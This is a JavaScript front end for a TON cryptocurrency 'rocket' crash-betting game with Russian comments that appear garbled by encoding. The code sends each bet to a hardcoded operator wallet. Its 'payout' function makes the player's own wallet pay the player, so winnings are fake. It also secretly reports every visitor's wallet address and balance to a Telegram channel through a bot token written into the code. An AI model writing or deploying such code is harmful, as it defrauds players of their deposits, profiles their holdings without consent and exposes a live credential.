const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/casino/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;
let gameRunning = false;
let multiplier = 1.00;
let gameInterval;
let betAmount = 0;
let rocketSpeedMultiplier = 0.05; // –ù–∞—á–∞–ª—å–Ω–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å –ø—Ä–∏—Ä–æ—Å—Ç–∞
let explosionChance = 0.02; // –ù–∞—á–∞–ª—å–Ω–∞—è –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –≤–∑—Ä—ã–≤–∞ —Ä–∞–∫–µ—Ç—ã
const mainWallet = "UQCII3MvhR52dvWjRPXjWepxPUJfJ6Tq1c1u5Raq5d_51Oqx";

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('–ê–¥—Ä–µ—Å –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞:', walletAddress);
        updateBalance(walletAddress);  // –û–±–Ω–æ–≤–∏—Ç—å –±–∞–ª–∞–Ω—Å –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
    }
});

async function updateBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        if (!data.balance) return;

        const balanceTON = parseFloat(data.balance) / 1000000000;
        console.log(`–ë–∞–ª–∞–Ω—Å: ${balanceTON} TON`);
        
        // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –±–∞–ª–∞–Ω—Å –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ
        document.getElementById('wallet-balance').innerText = balanceTON.toFixed(2);
        
        // –¢–∞–∫–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –≤ Telegram
        sendToTelegram(`üí∞ –ë–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞ <code>${walletAddress}</code>: <b>${balanceTON} TON</b>`);
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞:', error);
    }
}

async function startGame() {
    if (!walletAddress) return alert("–ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫!");
    
    betAmount = parseFloat(document.getElementById("betAmount").value);
    if (isNaN(betAmount) || betAmount <= 0) return alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—Ç–∞–≤–∫—É!");

    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞–≤–∫–∏
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{ address: mainWallet, amount: betAmount * 1000000000 }],
        sendMode: 5
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        console.log(`–°—Ç–∞–≤–∫–∞ ${betAmount} TON –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!`);
        updateBalance(walletAddress); // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ TON:", error);
        return;
    }

    // –ó–∞–ø—É—Å–∫ –∏–≥—Ä—ã
    gameRunning = true;
    multiplier = 1.00;
    document.getElementById("multiplier").innerText = multiplier.toFixed(2);

    // –°–ª—É—á–∞–π–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–∫–æ—Ä–æ—Å—Ç—å —Ä–æ—Å—Ç–∞ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–∞ –∏ —à–∞–Ω—Å –≤–∑—Ä—ã–≤–∞ —Ä–∞–∫–µ—Ç—ã
    rocketSpeedMultiplier = 0.05 + Math.random() * 0.05; // —Å–∫–æ—Ä–æ—Å—Ç—å –º–æ–∂–µ—Ç –≤–∞—Ä—å–∏—Ä–æ–≤–∞—Ç—å—Å—è –æ—Ç 0.05 –¥–æ 0.3
    explosionChance = Math.min(0.02 + rocketSpeedMultiplier * 0.5, 0.2); // —à–∞–Ω—Å –≤–∑—Ä—ã–≤–∞ —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç—Å—è —Å —Ä–æ—Å—Ç–æ–º —Å–∫–æ—Ä–æ—Å—Ç–∏

    let rocket = document.getElementById("rocket");
    rocket.style.transition = "bottom 2s ease-out";
    rocket.style.bottom = "50%"; // –ü–æ–¥–Ω—è—Ç–∏–µ –¥–æ —Å–µ—Ä–µ–¥–∏–Ω—ã

    setTimeout(() => {
        rocket.style.transition = "bottom 0.2s ease-in-out";
        startShakingRocket(rocket);
        startFallingStars();
    }, 2000);

    // –ó–∞–¥–µ—Ä–∂–∫–∞ –≤ 3 —Å–µ–∫—É–Ω–¥—ã –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º –ø—Ä–∏—Ä–æ—Å—Ç–∞ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–∞
    setTimeout(() => {
        gameInterval = setInterval(() => {
            if (!gameRunning) return;
            
            // –ü–ª–∞–≤–Ω–æ–µ —É–≤–µ–ª–∏—á–µ–Ω–∏–µ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ç–µ–∫—É—â–µ–≥–æ –º—É–ª—å—Ç–∏–ø–ª–∏–∫–∞—Ç–æ—Ä–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏
            multiplier += rocketSpeedMultiplier; // –ò—Å–ø–æ–ª—å–∑—É–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫—É—é —Å–∫–æ—Ä–æ—Å—Ç—å

            document.getElementById("multiplier").innerText = multiplier.toFixed(2);

            // –ü–æ–≤—ã—à–∞–µ–º –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –≤–∑—Ä—ã–≤–∞ —Ä–∞–∫–µ—Ç—ã —Å —É–≤–µ–ª–∏—á–µ–Ω–∏–µ–º —Å–∫–æ—Ä–æ—Å—Ç–∏ —Ä–æ—Å—Ç–∞ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–∞
            if (Math.random() < explosionChance * (multiplier / 2)) {
                endGame(false);
            }
        }, 50); // –£–º–µ–Ω—å—à–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª –¥–ª—è –±–æ–ª–µ–µ –ø–ª–∞–≤–Ω–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–∞
    }, 3000); // –ù–∞—á–∞—Ç—å –ø—Ä–∏—Ä–æ—Å—Ç –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
}

function stopGame() {
    if (!gameRunning) return;
    endGame(true);
}

function endGame(isWin) {
    gameRunning = false;
    clearInterval(gameInterval);
    clearFallingStars();

    let rocket = document.getElementById("rocket");
    rocket.style.transition = "bottom 2s ease-in-out";
    rocket.style.bottom = "10px"; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ä–∞–∫–µ—Ç—É –≤–Ω–∏–∑

    if (isWin) {
        alert(`üéâ –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏! –í–∞—à –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç: ${multiplier.toFixed(2)}x`);
        let winAmount = betAmount * multiplier;
        sendToTelegram(`‚úÖ –ò–≥—Ä–æ–∫ <code>${walletAddress}</code> –≤—ã–∏–≥—Ä–∞–ª <b>${winAmount.toFixed(2)} TON</b>`);
        sendWinTransaction(winAmount);
    } else {
        alert("üöÄ –†–∞–∫–µ—Ç–∞ –≤–∑–æ—Ä–≤–∞–ª–∞—Å—å! –í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏.");
    }
}

async function sendWinTransaction(amount) {
    if (!walletAddress) return;

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{ address: walletAddress, amount: Math.floor(amount * 1000000000) }],
        sendMode: 5
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        console.log(`–í—ã–ø–ª–∞—á–µ–Ω–æ ${amount.toFixed(2)} TON`);
        updateBalance(walletAddress);  // –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å –ø–æ—Å–ª–µ –≤—ã–ø–ª–∞—Ç—ã
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–ª–∞—Ç–µ –≤—ã–∏–≥—Ä—ã—à–∞:", error);
    }
}

async function sendToTelegram(message) {
    const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
    const chatId = "@ppjjkkd";

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
    }
}

// –¢—Ä—è—Å–∫–∞ —Ä–∞–∫–µ—Ç—ã
function startShakingRocket(rocket) {
    let shakeInterval = setInterval(() => {
        if (!gameRunning) {
            clearInterval(shakeInterval);
            return;
        }
        let randomOffset = Math.random() * 10 - 5;
        rocket.style.bottom = `calc(50% + ${randomOffset}px)`;
    }, 200);
}

// –°–æ–∑–¥–∞–Ω–∏–µ –ø–∞–¥–∞—é—â–∏—Ö –∑–≤–µ–∑–¥
function startFallingStars() {
    const gameContainer = document.querySelector(".game-container");
    
    for (let i = 0; i < 10; i++) {
        let star = document.createElement("img");
        star.src = "ton_logo.png";
        star.classList.add("falling-star");
        star.style.width = "50px";
        star.style.height = "50px";
        star.style.position = "absolute";
        star.style.left = `${Math.random() * 250}px`;
        star.style.top = "-50px";
        
        gameContainer.appendChild(star);
        animateStar(star);
    }
}

// –ê–Ω–∏–º–∞—Ü–∏—è –ø–∞–¥–µ–Ω–∏—è –∑–≤–µ–∑–¥
function animateStar(star) {
    let speed = 2 + Math.random() * 3;
    
    function fall() {
        if (!gameRunning) {
            star.remove();
            return;
        }
        
        let currentTop = parseFloat(star.style.top) || 0;
        if (currentTop > 300) {
            star.style.top = "-50px";
            star.style.left = `${Math.random() * 250}px`;
        } else {
            star.style.top = `${currentTop + speed}px`;
        }

        requestAnimationFrame(fall);
    }

    fall();
}

// –û—á–∏—Å—Ç–∫–∞ –∑–≤–µ–∑–¥ –ø—Ä–∏ –æ–∫–æ–Ω—á–∞–Ω–∏–∏ –∏–≥—Ä—ã
function clearFallingStars() {
    document.querySelectorAll(".falling-star").forEach(star => star.remove());
}
